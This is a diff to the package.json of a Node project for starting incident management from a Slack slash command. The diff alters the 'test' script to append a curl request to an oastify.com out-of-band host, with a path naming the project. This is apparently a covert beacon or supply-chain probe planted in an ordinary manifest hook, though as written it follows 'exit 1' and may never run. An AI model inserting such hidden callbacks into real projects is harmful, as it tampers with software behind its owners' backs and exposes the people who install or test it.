@@ -4,7 +4,7 @@
   "description": "Starting an incident management flow from a Slack Slash Command",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
+    "test": "echo \"Error: no test specified\" && exit 1 && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/messagebird-slack",
     "start": "node index.js"
   },
   "author": "René Feiner - MessageBird",
